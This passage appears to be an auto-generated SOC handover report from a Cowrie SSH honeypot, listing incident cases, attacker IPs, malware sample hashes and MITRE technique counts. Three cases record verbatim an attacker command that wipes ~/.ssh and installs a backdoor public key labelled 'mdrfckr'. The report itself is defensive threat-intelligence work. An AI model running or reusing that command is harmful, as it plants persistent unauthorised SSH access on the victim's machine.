| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 23:04:18` | `cowrie.session.connect` |
| `2026-06-14 23:04:18` | `cowrie.client.version` |
| `2026-06-14 23:04:18` | `cowrie.client.kex` |
| `2026-06-14 23:04:19` | `cowrie.login.success` |
| `2026-06-14 23:04:20` | `cowrie.session.params` |
| `2026-06-14 23:04:20` | `cowrie.command.input` |
| `2026-06-14 23:04:20` | `cowrie.command.failed` |
| `2026-06-14 23:04:20` | `cowrie.log.closed` |
| `2026-06-14 23:04:21` | `cowrie.session.params` |
| `2026-06-14 23:04:21` | `cowrie.command.input` |
| `2026-06-14 23:04:21` | `cowrie.session.file_download` |
| `2026-06-14 23:04:21` | `cowrie.log.closed` |
| `2026-06-14 23:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c624aa93f050

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-06-14 23:04 |
| **Last Seen** | 2026-06-14 23:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 23:04:24` | `cowrie.session.connect` |
| `2026-06-14 23:04:24` | `cowrie.client.version` |
| `2026-06-14 23:04:25` | `cowrie.client.kex` |
| `2026-06-14 23:04:26` | `cowrie.login.success` |
| `2026-06-14 23:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21713f930c70

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-06-14 23:06 |
| **Last Seen** | 2026-06-14 23:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 23:06:05` | `cowrie.session.connect` |
| `2026-06-14 23:06:05` | `cowrie.client.version` |
| `2026-06-14 23:06:06` | `cowrie.client.kex` |
| `2026-06-14 23:06:07` | `cowrie.login.success` |
| `2026-06-14 23:06:07` | `cowrie.session.params` |
| `2026-06-14 23:06:07` | `cowrie.command.input` |
| `2026-06-14 23:06:07` | `cowrie.command.failed` |
| `2026-06-14 23:06:08` | `cowrie.log.closed` |
| `2026-06-14 23:06:08` | `cowrie.session.params` |
| `2026-06-14 23:06:08` | `cowrie.command.input` |
| `2026-06-14 23:06:09` | `cowrie.session.file_download` |
| `2026-06-14 23:06:09` | `cowrie.log.closed` |
| `2026-06-14 23:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c71f3f620d37

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-06-14 23:06 |
| **Last Seen** | 2026-06-14 23:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 23:06:12` | `cowrie.session.connect` |
| `2026-06-14 23:06:12` | `cowrie.client.version` |
| `2026-06-14 23:06:12` | `cowrie.client.kex` |
| `2026-06-14 23:06:14` | `cowrie.login.success` |
| `2026-06-14 23:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-863d723557ce

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-06-14 23:11 |
| **Last Seen** | 2026-06-14 23:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 23:11:06` | `cowrie.session.connect` |
| `2026-06-14 23:11:06` | `cowrie.client.version` |
| `2026-06-14 23:11:07` | `cowrie.client.kex` |
| `2026-06-14 23:11:08` | `cowrie.login.success` |
| `2026-06-14 23:11:09` | `cowrie.session.params` |
| `2026-06-14 23:11:09` | `cowrie.command.input` |
| `2026-06-14 23:11:09` | `cowrie.command.failed` |
| `2026-06-14 23:11:09` | `cowrie.log.closed` |
| `2026-06-14 23:11:09` | `cowrie.session.params` |
| `2026-06-14 23:11:09` | `cowrie.command.input` |
| `2026-06-14 23:11:10` | `cowrie.session.file_download` |
| `2026-06-14 23:11:10` | `cowrie.log.closed` |
| `2026-06-14 23:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1a5750363ef

| Field | Detail |
|---|---|
| **Source IP** | `179.32.33[.]161` |
| **First Seen** | 2026-06-14 23:11 |
| **Last Seen** | 2026-06-14 23:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 23:11:13` | `cowrie.session.connect` |
| `2026-06-14 23:11:13` | `cowrie.client.version` |
| `2026-06-14 23:11:13` | `cowrie.client.kex` |
| `2026-06-14 23:11:15` | `cowrie.login.success` |
| `2026-06-14 23:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.32.33[.]161` to AbuseIPDB if not already reported
- [ ] Block `179.32.33[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `47.83.133[.]46` | **73** | 2026-06-14 22:31 | 2026-06-14 22:40 | 3m | 71 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `4.227.177[.]11` | **31** | 2026-06-14 21:44 | 2026-06-14 22:44 | 1m | 31 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `153.121.70[.]198` | **17** | 2026-06-14 21:17 | 2026-06-14 21:46 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `179.32.33[.]161` | **9** | 2026-06-14 22:49 | 2026-06-14 23:11 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `153.121.70[.]198` | JP | SAKURA Internet Inc. | **100** ⚠️ | 3 |
| `4.227.177[.]11` | US | Microsoft Corporation | **100** ⚠️ | 24 |
| `47.83.133[.]46` | HK | Alibaba Cloud LLC | **100** ⚠️ | 17 |
| `179.32.33[.]161` | CO | COLOMBIA TELECOMUNICACIONES S.A. ESP | **100** ⚠️ | 50 |
| `104.209.7[.]34` | US | Microsoft Corporation | **77** | 0 |
| `153.117.1[.]192` | PK | Cyber Internet Services Pvt Ltd | **71** | 2 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 188 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 128 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 58 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 214 cases |
| Tool 34  | Credential Extractor        | ✅ 186 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 6 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (12.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 5 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 58 priority case(s) shown individually · 4 recon entry/entries in table (4 group(s) consolidating 130 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-14T23:12:56Z_
